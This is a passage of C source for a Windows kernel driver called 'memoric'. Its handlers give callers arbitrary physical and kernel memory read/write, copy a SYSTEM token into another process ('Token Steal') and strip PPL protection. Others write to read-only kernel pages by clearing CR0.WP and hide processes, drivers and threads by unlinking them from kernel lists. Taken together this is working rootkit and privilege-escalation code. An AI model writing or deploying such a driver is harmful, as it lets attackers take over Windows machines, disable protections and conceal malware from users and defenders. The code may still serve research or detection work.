    } __except (EXCEPTION_EXECUTE_HANDLER) {
        MmUnmapIoSpace(mapped, Size);
        return STATUS_ACCESS_VIOLATION;
    }

    MmUnmapIoSpace(mapped, Size);
    return STATUS_SUCCESS;
}

/* ================================================================
 * Caller Verification — restrict driver access to privileged callers
 *
 * Checks that the calling process has SeDebugPrivilege enabled,
 * which requires admin rights. This prevents unprivileged processes
 * from using the driver even if they know the device path.
 * ================================================================ */

static BOOLEAN IsCallerPrivileged(void)
{
    SECURITY_SUBJECT_CONTEXT subjectContext;
    PRIVILEGE_SET privSet;
    BOOLEAN hasPrivilege;

    SeCaptureSubjectContext(&subjectContext);

    /* Require SeDebugPrivilege (value 20 = 0x14) */
    privSet.PrivilegeCount = 1;
    privSet.Control = PRIVILEGE_SET_ALL_NECESSARY;
    privSet.Privilege[0].Luid.LowPart = 20; /* SE_DEBUG_PRIVILEGE */
    privSet.Privilege[0].Luid.HighPart = 0;
    privSet.Privilege[0].Attributes = 0;

    hasPrivilege = SePrivilegeCheck(&privSet, &subjectContext, UserMode);
    SeReleaseSubjectContext(&subjectContext);

    return hasPrivilege;
}

/* ================================================================
 * Physical Memory Operations
 * ================================================================ */

static NTSTATUS HandlePhysRead(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    PMEMORIC_PHYS_REQUEST req;
    PHYSICAL_ADDRESS physAddr;
    MM_COPY_ADDRESS copyAddr;
    SIZE_T bytesTransferred = 0;
    NTSTATUS status;

    if (InputLength < sizeof(MEMORIC_PHYS_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;

    req = (PMEMORIC_PHYS_REQUEST)SystemBuffer;

    if (req->Size == 0 || req->Size > MEMORIC_MAX_IO_SIZE)
        return STATUS_INVALID_PARAMETER;
    if (OutputLength < req->Size)
        return STATUS_BUFFER_TOO_SMALL;

    physAddr.QuadPart = (LONGLONG)req->PhysicalAddress;
    copyAddr.PhysicalAddress = physAddr;

    /* MmCopyMemory is the safest way to read physical memory (Win8.1+) */
    status = MmCopyMemory(SystemBuffer, copyAddr, req->Size,
                          MM_COPY_MEMORY_PHYSICAL, &bytesTransferred);

    if (NT_SUCCESS(status))
        *BytesReturned = (ULONG)bytesTransferred;

    return status;
}

static NTSTATUS HandlePhysWrite(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    PMEMORIC_PHYS_WRITE_REQUEST req;
    PHYSICAL_ADDRESS physAddr;
    PVOID mapped;
    PUCHAR data;

    if (InputLength < sizeof(MEMORIC_PHYS_WRITE_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;

    req = (PMEMORIC_PHYS_WRITE_REQUEST)SystemBuffer;

    if (req->Size == 0 || req->Size > MEMORIC_MAX_IO_SIZE)
        return STATUS_INVALID_PARAMETER;
    if (InputLength < sizeof(MEMORIC_PHYS_WRITE_REQUEST) + req->Size)
        return STATUS_BUFFER_TOO_SMALL;

    data = (PUCHAR)SystemBuffer + sizeof(MEMORIC_PHYS_WRITE_REQUEST);
    physAddr.QuadPart = (LONGLONG)req->PhysicalAddress;

    /* Map physical page into kernel virtual address space */
    mapped = MmMapIoSpace(physAddr, req->Size, MmNonCached);
    if (!mapped)
        return STATUS_INSUFFICIENT_RESOURCES;

    RtlCopyMemory(mapped, data, req->Size);
    MmUnmapIoSpace(mapped, req->Size);

    *BytesReturned = 0;
    return STATUS_SUCCESS;
}

/* ================================================================
 * Virtual Memory Operations
 * ================================================================ */

static NTSTATUS HandleVirtRead(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    MEMORIC_VIRT_REQUEST reqCopy;
    PEPROCESS process = NULL;
    NTSTATUS status;
    SIZE_T bytesRead = 0;

    if (InputLength < sizeof(MEMORIC_VIRT_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;

    /* Save request before SystemBuffer is overwritten with output */
    RtlCopyMemory(&reqCopy, SystemBuffer, sizeof(MEMORIC_VIRT_REQUEST));

    if (reqCopy.Size == 0 || reqCopy.Size > MEMORIC_MAX_IO_SIZE)
        return STATUS_INVALID_PARAMETER;
    if (OutputLength < reqCopy.Size)
        return STATUS_BUFFER_TOO_SMALL;

    /* Kernel memory: use MmCopyMemory for safe access */
    if (reqCopy.ProcessId == 0 || reqCopy.ProcessId == 4) {
        MM_COPY_ADDRESS copyAddr;
        copyAddr.VirtualAddress = (PVOID)reqCopy.Address;

        status = MmCopyMemory(SystemBuffer, copyAddr, reqCopy.Size,
                              MM_COPY_MEMORY_VIRTUAL, &bytesRead);
        if (NT_SUCCESS(status))
            *BytesReturned = (ULONG)bytesRead;
        return status;
    }

    /* Cross-process read via MmCopyVirtualMemory */
    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)reqCopy.ProcessId, &process);
    if (!NT_SUCCESS(status))
        return status;

    status = MmCopyVirtualMemory(
        process,                        /* source process */
        (PVOID)reqCopy.Address,         /* source address */
        PsGetCurrentProcess(),          /* target = kernel (our context) */
        SystemBuffer,                   /* target address = output buffer */
        reqCopy.Size,
        KernelMode,
        &bytesRead
    );

    if (NT_SUCCESS(status))
        *BytesReturned = (ULONG)bytesRead;

    ObDereferenceObject(process);
    return status;
}

static NTSTATUS HandleVirtWrite(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    PMEMORIC_VIRT_WRITE_REQUEST req;
    PEPROCESS process = NULL;
    NTSTATUS status;
    SIZE_T bytesWritten = 0;
    PUCHAR data;

    if (InputLength < sizeof(MEMORIC_VIRT_WRITE_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;

    req = (PMEMORIC_VIRT_WRITE_REQUEST)SystemBuffer;

    if (req->Size == 0 || req->Size > MEMORIC_MAX_IO_SIZE)
        return STATUS_INVALID_PARAMETER;
    if (InputLength < sizeof(MEMORIC_VIRT_WRITE_REQUEST) + req->Size)
        return STATUS_BUFFER_TOO_SMALL;

    data = (PUCHAR)SystemBuffer + sizeof(MEMORIC_VIRT_WRITE_REQUEST);

    /* Kernel memory write: use force-write IOCTL instead for read-only pages */
    if (req->ProcessId == 0 || req->ProcessId == 4) {
        __try {
            RtlCopyMemory((PVOID)req->Address, data, req->Size);
            *BytesReturned = 0;
            return STATUS_SUCCESS;
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return GetExceptionCode();
        }
    }

    /* Cross-process write via MmCopyVirtualMemory */
    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)req->ProcessId, &process);
    if (!NT_SUCCESS(status))
        return status;

    status = MmCopyVirtualMemory(
        PsGetCurrentProcess(),  /* source = our kernel buffer */
        data,                   /* source address = data after header */
        process,                /* target process */
        (PVOID)req->Address,    /* target address */
        req->Size,
        KernelMode,
        &bytesWritten
    );

    *BytesReturned = 0;
    ObDereferenceObject(process);
    return status;
}

/* ================================================================
 * CR3 & EPROCESS Information
 * ================================================================ */

static NTSTATUS HandleGetCr3(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    PMEMORIC_CR3_REQUEST req;
    PMEMORIC_CR3_RESPONSE resp;
    PEPROCESS process = NULL;
    NTSTATUS status;

    if (InputLength < sizeof(MEMORIC_CR3_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (OutputLength < sizeof(MEMORIC_CR3_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    req = (PMEMORIC_CR3_REQUEST)SystemBuffer;
    resp = (PMEMORIC_CR3_RESPONSE)SystemBuffer;

    if (req->ProcessId == 0) {
        /* Current process CR3 via intrinsic */
        resp->Cr3Value = __readcr3();
        resp->EprocessAddress = (ULONG64)PsGetCurrentProcess();
    } else {
        ULONG pid = req->ProcessId;  /* save before overwrite */
        status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &process);
        if (!NT_SUCCESS(status))
            return status;

        /* Read DirectoryTableBase from EPROCESS */
        resp->Cr3Value = *(PULONG64)((PUCHAR)process + g_Offsets.DirectoryTableBase);
        resp->EprocessAddress = (ULONG64)process;

        ObDereferenceObject(process);
    }

    *BytesReturned = sizeof(MEMORIC_CR3_RESPONSE);
    return STATUS_SUCCESS;
}

static NTSTATUS HandleGetEprocess(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    MEMORIC_EPROCESS_REQUEST reqCopy;
    PMEMORIC_EPROCESS_RESPONSE resp;
    PEPROCESS process = NULL;
    NTSTATUS status;

    if (InputLength < sizeof(MEMORIC_EPROCESS_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (OutputLength < sizeof(MEMORIC_EPROCESS_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;
    if (!g_Offsets.Resolved)
        return STATUS_DEVICE_NOT_READY;

    /* Save request before overwriting buffer */
    RtlCopyMemory(&reqCopy, SystemBuffer, sizeof(MEMORIC_EPROCESS_REQUEST));
    resp = (PMEMORIC_EPROCESS_RESPONSE)SystemBuffer;

    if (reqCopy.ProcessId == 0) {
        process = PsGetCurrentProcess();
    } else {
        status = PsLookupProcessByProcessId(
            (HANDLE)(ULONG_PTR)reqCopy.ProcessId, &process);
        if (!NT_SUCCESS(status))
            return status;
    }

    RtlZeroMemory(resp, sizeof(MEMORIC_EPROCESS_RESPONSE));

    resp->EprocessAddress = (ULONG64)process;
    resp->Token = *(PULONG64)((PUCHAR)process + g_Offsets.Token);
    resp->DirectoryTableBase = *(PULONG64)((PUCHAR)process + g_Offsets.DirectoryTableBase);
    resp->UniqueProcessId = (ULONG64)PsGetProcessId(process);

    /* Report discovered offsets */
    resp->UniqueProcessIdOff = g_Offsets.UniqueProcessId;
    resp->ActiveProcessLinksOff = g_Offsets.ActiveProcessLinks;
    resp->TokenOff = g_Offsets.Token;
    resp->ProtectionOff = g_Offsets.Protection;
    resp->ImageFileNameOff = g_Offsets.ImageFileName;
    resp->VadRootOff = g_Offsets.VadRoot;

    /* Copy image file name */
    if (g_Offsets.ImageFileName) {
        PUCHAR name = (PUCHAR)process + g_Offsets.ImageFileName;
        RtlCopyMemory(resp->ImageFileName, name, 15);
        resp->ImageFileName[15] = 0;
    }

    if (reqCopy.ProcessId != 0)
        ObDereferenceObject(process);

    *BytesReturned = sizeof(MEMORIC_EPROCESS_RESPONSE);
    return STATUS_SUCCESS;
}

/* ================================================================
 * Token Steal - copy SYSTEM token to target process
 * ================================================================ */

static NTSTATUS HandleTokenSteal(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    PMEMORIC_TOKEN_REQUEST req;
    PEPROCESS sourceProcess = NULL;
    PEPROCESS targetProcess = NULL;
    NTSTATUS status;
    ULONG64 sourceToken;

    if (InputLength < sizeof(MEMORIC_TOKEN_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (!g_Offsets.Resolved)
        return STATUS_DEVICE_NOT_READY;

    req = (PMEMORIC_TOKEN_REQUEST)SystemBuffer;

    status = PsLookupProcessByProcessId(
        (HANDLE)(ULONG_PTR)req->SourcePid, &sourceProcess);
    if (!NT_SUCCESS(status))
        return status;

    status = PsLookupProcessByProcessId(
        (HANDLE)(ULONG_PTR)req->TargetPid, &targetProcess);
    if (!NT_SUCCESS(status)) {
        ObDereferenceObject(sourceProcess);
        return status;
    }

    /* Read source token (EX_FAST_REF: pointer | refcount) */
    sourceToken = *(PULONG64)((PUCHAR)sourceProcess + g_Offsets.Token);

    /* Overwrite target token */
    *(PULONG64)((PUCHAR)targetProcess + g_Offsets.Token) = sourceToken;

    DbgPrint("[memoric] Token stolen: PID %u -> PID %u (token=0x%llX)\n",
             req->SourcePid, req->TargetPid, sourceToken);

    ObDereferenceObject(targetProcess);
    ObDereferenceObject(sourceProcess);

    *BytesReturned = 0;
    return STATUS_SUCCESS;
}

/* ================================================================
 * DKOM Process Hide - unlink from ActiveProcessLinks
 * ================================================================ */

static NTSTATUS HandleDkomHide(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    PMEMORIC_HIDE_REQUEST req;
    PEPROCESS process = NULL;
    PLIST_ENTRY links;
    PLIST_ENTRY prev, next;
    NTSTATUS status;
    KIRQL oldIrql;

    if (InputLength < sizeof(MEMORIC_HIDE_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (!g_Offsets.Resolved)
        return STATUS_DEVICE_NOT_READY;

    req = (PMEMORIC_HIDE_REQUEST)SystemBuffer;

    /* Refuse to hide PID 0 or 4 */
    if (req->ProcessId == 0 || req->ProcessId == 4)
        return STATUS_INVALID_PARAMETER;

    status = PsLookupProcessByProcessId(
        (HANDLE)(ULONG_PTR)req->ProcessId, &process);
    if (!NT_SUCCESS(status))
        return status;

    links = (PLIST_ENTRY)((PUCHAR)process + g_Offsets.ActiveProcessLinks);

    /* Raise IRQL to prevent preemption during list manipulation */
    KeRaiseIrql(APC_LEVEL, &oldIrql);

    prev = links->Blink;
    next = links->Flink;

    /* Unlink: prev->Flink = next, next->Blink = prev */
    prev->Flink = next;
    next->Blink = prev;

    /* Self-reference to prevent BSOD on process exit */
    links->Flink = links;
    links->Blink = links;

    KeLowerIrql(oldIrql);

    DbgPrint("[memoric] DKOM: Process %u unlinked from ActiveProcessLinks\n",
             req->ProcessId);

    ObDereferenceObject(process);

    *BytesReturned = 0;
    return STATUS_SUCCESS;
}

/* ================================================================
 * PPL Remove - zero PS_PROTECTION field
 * ================================================================ */

static NTSTATUS HandlePplRemove(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    PMEMORIC_PPL_REQUEST req;
    PEPROCESS process = NULL;
    NTSTATUS status;
    UCHAR oldProtection;

    if (InputLength < sizeof(MEMORIC_PPL_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (!g_Offsets.Resolved || g_Offsets.Protection == 0)
        return STATUS_DEVICE_NOT_READY;

    req = (PMEMORIC_PPL_REQUEST)SystemBuffer;

    status = PsLookupProcessByProcessId(
        (HANDLE)(ULONG_PTR)req->ProcessId, &process);
    if (!NT_SUCCESS(status))
        return status;

    /* Read current protection level */
    oldProtection = *(PUCHAR)((PUCHAR)process + g_Offsets.Protection);

    /* Zero the PS_PROTECTION byte */
    *(PUCHAR)((PUCHAR)process + g_Offsets.Protection) = 0;

    DbgPrint("[memoric] PPL removed: PID %u, old protection=0x%02X\n",
             req->ProcessId, oldProtection);

    ObDereferenceObject(process);

    *BytesReturned = 0;
    return STATUS_SUCCESS;
}

/* ================================================================
 * Force Kernel Write - CR0.WP bypass for read-only pages
 * ================================================================ */

static NTSTATUS HandleForceKernelWrite(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    PMEMORIC_KERNEL_WRITE_REQUEST req;
    PUCHAR data;
    KIRQL oldIrql;
    ULONG_PTR cr0;
    NTSTATUS status = STATUS_SUCCESS;

    if (InputLength < sizeof(MEMORIC_KERNEL_WRITE_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;

    req = (PMEMORIC_KERNEL_WRITE_REQUEST)SystemBuffer;

    if (req->Size == 0 || req->Size > MEMORIC_MAX_FORCE_WRITE)
        return STATUS_INVALID_PARAMETER;
    if (InputLength < sizeof(MEMORIC_KERNEL_WRITE_REQUEST) + req->Size)
        return STATUS_BUFFER_TOO_SMALL;

    /* Validate target is a kernel address */
    if (req->Address < 0xFFFF000000000000ULL)
        return STATUS_INVALID_PARAMETER;

    data = (PUCHAR)SystemBuffer + sizeof(MEMORIC_KERNEL_WRITE_REQUEST);

    /* Raise IRQL to DISPATCH_LEVEL to prevent preemption */
    KeRaiseIrql(DISPATCH_LEVEL, &oldIrql);

    /* Clear CR0.WP bit to allow writes to read-only pages */
    cr0 = __readcr0();
    __writecr0(cr0 & ~(1ULL << 16));

    __try {
        RtlCopyMemory((PVOID)req->Address, data, req->Size);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
    }

    /* Restore CR0.WP */
    __writecr0(cr0);
    KeLowerIrql(oldIrql);

    if (NT_SUCCESS(status))
        DbgPrint("[memoric] Force-write %u bytes to 0x%llX\n", req->Size, req->Address);

    *BytesReturned = 0;
    return status;
}

/* ================================================================
 * VA to PA Translation - MmGetPhysicalAddress
 * ================================================================ */

static NTSTATUS HandleVaToPa(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    MEMORIC_VA2PA_REQUEST reqCopy;
    PMEMORIC_VA2PA_RESPONSE resp;
    PEPROCESS process = NULL;
    PHYSICAL_ADDRESS pa;
    NTSTATUS status;

    if (InputLength < sizeof(MEMORIC_VA2PA_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (OutputLength < sizeof(MEMORIC_VA2PA_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    /* Save request before overwriting buffer */
    RtlCopyMemory(&reqCopy, SystemBuffer, sizeof(MEMORIC_VA2PA_REQUEST));
    resp = (PMEMORIC_VA2PA_RESPONSE)SystemBuffer;

    if (reqCopy.ProcessId == 0) {
        /* Current/kernel context */
        pa = MmGetPhysicalAddress((PVOID)reqCopy.VirtualAddress);
        resp->PhysicalAddress = (ULONG64)pa.QuadPart;
    } else {
        /* Attach to target process context for address translation */
        KAPC_STATE apcState;

        status = PsLookupProcessByProcessId(
            (HANDLE)(ULONG_PTR)reqCopy.ProcessId, &process);
        if (!NT_SUCCESS(status))
            return status;

        KeStackAttachProcess(process, &apcState);

        pa = MmGetPhysicalAddress((PVOID)reqCopy.VirtualAddress);
        resp->PhysicalAddress = (ULONG64)pa.QuadPart;

        KeUnstackDetachProcess(&apcState);
        ObDereferenceObject(process);
    }

    *BytesReturned = sizeof(MEMORIC_VA2PA_RESPONSE);
    return STATUS_SUCCESS;
}

/* ================================================================
 * Process Enumeration - walk ActiveProcessLinks from kernel
 * Invisible to any usermode API hooks. Returns ground truth.
 * ================================================================ */

static NTSTATUS HandleEnumProcess(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    MEMORIC_ENUM_PROCESS_REQUEST reqCopy;
    PMEMORIC_PROCESS_ENTRY entries;
    PEPROCESS systemProcess;
    PEPROCESS current;
    PLIST_ENTRY head, entry;
    ULONG maxEntries, count = 0;

    if (InputLength < sizeof(MEMORIC_ENUM_PROCESS_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (!g_Offsets.Resolved)
        return STATUS_DEVICE_NOT_READY;

    RtlCopyMemory(&reqCopy, SystemBuffer, sizeof(MEMORIC_ENUM_PROCESS_REQUEST));
    maxEntries = reqCopy.MaxEntries > 0 ? reqCopy.MaxEntries : 1024;

    /* Check output buffer can hold at least one entry */
    if (OutputLength < sizeof(MEMORIC_PROCESS_ENTRY))
        return STATUS_BUFFER_TOO_SMALL;

    /* Limit to what output buffer can hold */
    {
        ULONG maxByBuffer = OutputLength / sizeof(MEMORIC_PROCESS_ENTRY);
        if (maxEntries > maxByBuffer)
            maxEntries = maxByBuffer;
    }

    entries = (PMEMORIC_PROCESS_ENTRY)SystemBuffer;
    RtlZeroMemory(entries, maxEntries * sizeof(MEMORIC_PROCESS_ENTRY));

    /* Start from SYSTEM process (PID 4) */
    systemProcess = PsInitialSystemProcess;
    if (!systemProcess)
        return STATUS_UNSUCCESSFUL;

    head = (PLIST_ENTRY)((PUCHAR)systemProcess + g_Offsets.ActiveProcessLinks);
    entry = head;

    do {
        current = (PEPROCESS)((PUCHAR)entry - g_Offsets.ActiveProcessLinks);

        if (count < maxEntries) {
            PMEMORIC_PROCESS_ENTRY e = &entries[count];

            e->ProcessId = (ULONG)(ULONG_PTR)PsGetProcessId(current);
            e->EprocessAddress = (ULONG64)current;
            e->DirectoryTableBase = *(PULONG64)((PUCHAR)current + g_Offsets.DirectoryTableBase);
            e->Token = *(PULONG64)((PUCHAR)current + g_Offsets.Token);

            /* Image file name */
            if (g_Offsets.ImageFileName) {
                PUCHAR name = (PUCHAR)current + g_Offsets.ImageFileName;
                RtlCopyMemory(e->ImageFileName, name, 15);
                e->ImageFileName[15] = 0;
            }

            /* Protection level */
            if (g_Offsets.Protection) {
                e->Protection = *(PUCHAR)((PUCHAR)current + g_Offsets.Protection);
            }

            /* Parent PID: InheritedFromUniqueProcessId */
            __try {
                if (g_Offsets.InheritedFromUniqueProcessId) {
                    e->ParentProcessId = (ULONG)*(PULONG_PTR)((PUCHAR)current + g_Offsets.InheritedFromUniqueProcessId);
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                e->ParentProcessId = 0;
            }

            count++;
        }

        entry = entry->Flink;
    } while (entry != head && count < maxEntries);

    *BytesReturned = count * sizeof(MEMORIC_PROCESS_ENTRY);
    DbgPrint("[memoric] EnumProcess: returned %lu processes\n", count);
    return STATUS_SUCCESS;
}

/* ================================================================
 * Module Hide - unlink driver from PsLoadedModuleList
 *
 * Walks the kernel's module list (same list used by
 * NtQuerySystemInformation / EnumDeviceDrivers) and unlinks
 * the target driver entry.
 * ================================================================ */

/* Kernel's loaded module entry (subset of LDR_DATA_TABLE_ENTRY) */
typedef struct _KLDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    PVOID ExceptionTable;
    ULONG ExceptionTableSize;
    PVOID GpValue;
    PVOID NonPagedDebugInfo;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    /* ... more fields follow */
} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;

static NTSTATUS HandleModuleHide(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    PMEMORIC_MODULE_HIDE_REQUEST req;
    PKLDR_DATA_TABLE_ENTRY entry;
    PKLDR_DATA_TABLE_ENTRY ourEntry;
    PLIST_ENTRY head, current;
    UNICODE_STRING targetName;
    BOOLEAN found = FALSE;

    UNREFERENCED_PARAMETER(OutputLength);

    if (InputLength < sizeof(MEMORIC_MODULE_HIDE_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;

    req = (PMEMORIC_MODULE_HIDE_REQUEST)SystemBuffer;

    /* Null-terminate to be safe */
    req->DriverName[63] = L'\0';
    RtlInitUnicodeString(&targetName, req->DriverName);

    /* g_DeviceObject->DriverObject->DriverSection points to our LDR entry */
    if (!g_DeviceObject || !g_DeviceObject->DriverObject)
        return STATUS_UNSUCCESSFUL;

    ourEntry = (PKLDR_DATA_TABLE_ENTRY)g_DeviceObject->DriverObject->DriverSection;
    if (!ourEntry)
        return STATUS_UNSUCCESSFUL;

    head = &ourEntry->InLoadOrderLinks;

    /* 
     * Walk the circular list from our entry.
     * If targetName matches any BaseDllName, unlink it.
     */
    current = head->Flink;
    while (current != head) {
        entry = CONTAINING_RECORD(current, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        current = current->Flink; /* advance before unlinking */

        if (entry->BaseDllName.Buffer && entry->BaseDllName.Length > 0) {
            if (RtlCompareUnicodeString(&entry->BaseDllName, &targetName, TRUE) == 0) {
                KIRQL oldIrql;
                KeRaiseIrql(APC_LEVEL, &oldIrql);

                /* Unlink from InLoadOrderLinks */
                entry->InLoadOrderLinks.Blink->Flink = entry->InLoadOrderLinks.Flink;
                entry->InLoadOrderLinks.Flink->Blink = entry->InLoadOrderLinks.Blink;

                /* Self-reference to prevent BSOD */
                entry->InLoadOrderLinks.Flink = &entry->InLoadOrderLinks;
                entry->InLoadOrderLinks.Blink = &entry->InLoadOrderLinks;

                KeLowerIrql(oldIrql);

                DbgPrint("[memoric] ModuleHide: Unlinked '%wZ' from PsLoadedModuleList\n",
                         &targetName);
                found = TRUE;
                break;
            }
        }
    }

    *BytesReturned = 0;
    return found ? STATUS_SUCCESS : STATUS_NOT_FOUND;
}

/* ================================================================
 * Thread Hide - unlink thread from its process's thread list
 * ================================================================ */

/*
 * Dynamic discovery of EPROCESS.ThreadListHead and ETHREAD.ThreadListEntry
 * offsets. Instead of hardcoding per-build values, we find them at runtime.
 *
 * Algorithm:
 * 1. Look up the target thread and its owning process
 * 2. Scan the ETHREAD for LIST_ENTRY fields where at least one link
 *    (Flink or Blink) points into the EPROCESS structure
 * 3. The ETHREAD offset is the ThreadListEntry, and the EPROCESS target
 *    is the ThreadListHead
 * 4. Cache for future calls
 */
static ULONG g_ThreadListHeadOffset = 0;
static ULONG g_ThreadListEntryOffset = 0;

static BOOLEAN DiscoverThreadListOffsets(PEPROCESS process, PETHREAD thread)
{
    ULONG_PTR procBase = (ULONG_PTR)process;
    ULONG_PTR procEnd  = procBase + 0xA00;
    ULONG offset;

    for (offset = 0x200; offset < 0x800; offset += sizeof(ULONG_PTR)) {
        __try {
            PLIST_ENTRY candidate = (PLIST_ENTRY)((PUCHAR)thread + offset);
            ULONG_PTR flink = (ULONG_PTR)candidate->Flink;
            ULONG_PTR blink = (ULONG_PTR)candidate->Blink;

            /* Both must be valid kernel pointers */
            if (flink < 0xFFFF000000000000ULL || blink < 0xFFFF000000000000ULL)
                continue;

            /* Check if either link points into the EPROCESS structure */
            BOOLEAN flinkInProc = (flink >= procBase && flink < procEnd);
            BOOLEAN blinkInProc = (blink >= procBase && blink < procEnd);

            if (flinkInProc || blinkInProc) {
                /* Determine which offset in EPROCESS is the ThreadListHead */
                ULONG headOff;
                if (flinkInProc)
                    headOff = (ULONG)(flink - procBase);
                else
                    headOff = (ULONG)(blink - procBase);

                /* Verify: the ThreadListHead at that EPROCESS offset should
                 * be a LIST_ENTRY whose links point to valid ETHREAD regions.
                 * Check that it's properly aligned and the head's Flink/Blink
                 * are also valid kernel pointers. */
                PLIST_ENTRY headEntry = (PLIST_ENTRY)(procBase + headOff);
                if ((ULONG_PTR)headEntry->Flink > 0xFFFF000000000000ULL &&
                    (ULONG_PTR)headEntry->Blink > 0xFFFF000000000000ULL) {
                    /* Additional validation: walk one step and verify the derived
                     * ETHREAD has a valid thread ID (PsGetThreadId check) */
                    PLIST_ENTRY firstEntry = headEntry->Flink;
                    if (firstEntry != headEntry) {
                        PETHREAD checkThread = (PETHREAD)((PUCHAR)firstEntry - offset);
                        __try {
                            HANDLE checkTid = PsGetThreadId(checkThread);
                            if ((ULONG_PTR)checkTid > 0 && (ULONG_PTR)checkTid < 0x100000) {
                                g_ThreadListHeadOffset = headOff;
                                g_ThreadListEntryOffset = offset;
                                DbgPrint("[memoric] ThreadHide: Discovered ThreadListHead=0x%X, ThreadListEntry=0x%X\n",
                                         headOff, offset);
                                return TRUE;
                            }
                        } __except (EXCEPTION_EXECUTE_HANDLER) { continue; }
                    }
                }
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) { continue; }
    }

    return FALSE;
}

static NTSTATUS HandleThreadHide(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    PMEMORIC_THREAD_HIDE_REQUEST req;
    PEPROCESS process = NULL;
    PETHREAD thread = NULL;
    NTSTATUS status;
    PLIST_ENTRY threadListHead;
    PLIST_ENTRY entry, prev, next;
    BOOLEAN found = FALSE;

    UNREFERENCED_PARAMETER(OutputLength);

    if (InputLength < sizeof(MEMORIC_THREAD_HIDE_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;

    req = (PMEMORIC_THREAD_HIDE_REQUEST)SystemBuffer;

    status = PsLookupThreadByThreadId((HANDLE)(ULONG_PTR)req->ThreadId, &thread);
    if (!NT_SUCCESS(status))
        return status;

    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)req->ProcessId, &process);
    if (!NT_SUCCESS(status)) {
        ObDereferenceObject(thread);
        return status;
    }

    /* Discover ThreadListHead/ThreadListEntry offsets if not yet known */
    if (g_ThreadListHeadOffset == 0 || g_ThreadListEntryOffset == 0) {
        if (!DiscoverThreadListOffsets(process, thread)) {
            ObDereferenceObject(process);
            ObDereferenceObject(thread);
            DbgPrint("[memoric] ThreadHide: Failed to discover thread list offsets\n");
            return STATUS_UNSUCCESSFUL;
        }
    }

    threadListHead = (PLIST_ENTRY)((PUCHAR)process + g_ThreadListHeadOffset);

    entry = threadListHead->Flink;
    while (entry != threadListHead) {
        PETHREAD candidate = (PETHREAD)((PUCHAR)entry - g_ThreadListEntryOffset);

        if (candidate == thread) {
            KIRQL oldIrql;
            KeRaiseIrql(APC_LEVEL, &oldIrql);

            prev = entry->Blink;
            next = entry->Flink;
            prev->Flink = next;
            next->Blink = prev;
            entry->Flink = entry;
            entry->Blink = entry;

            KeLowerIrql(oldIrql);

            DbgPrint("[memoric] ThreadHide: Unlinked TID %u from PID %u thread list\n",
                     req->ThreadId, req->ProcessId);
            found = TRUE;
            break;
        }

        entry = entry->Flink;
    }

    ObDereferenceObject(process);
    ObDereferenceObject(thread);

    *BytesReturned = 0;
    return found ? STATUS_SUCCESS : STATUS_NOT_FOUND;
}

/* ================================================================
 * Callback Enumeration
 *
 * Enumerates kernel notification callbacks:
 * - Process (PspCreateProcessNotifyRoutine)
 * - Thread (PspCreateThreadNotifyRoutine)
 * - Image (PspLoadImageNotifyRoutine)
 *
 * These are arrays of EX_CALLBACK_ROUTINE_BLOCK pointers.
 * The pointer is stored as an EX_FAST_REF (low bits = ref count).
 * ================================================================ */

/* PsInitialSystemProcess is declared in ntddk.h — no extra extern needed */

/*
 * Resolve callback array base from known kernel exports.
 * The arrays PspCreateProcessNotifyRoutine etc are not exported,
 * but we can locate them relative to the Psp*NotifyRoutineCount exports.
 *
 * Alternative: scan for patterns in ntoskrnl code sections.
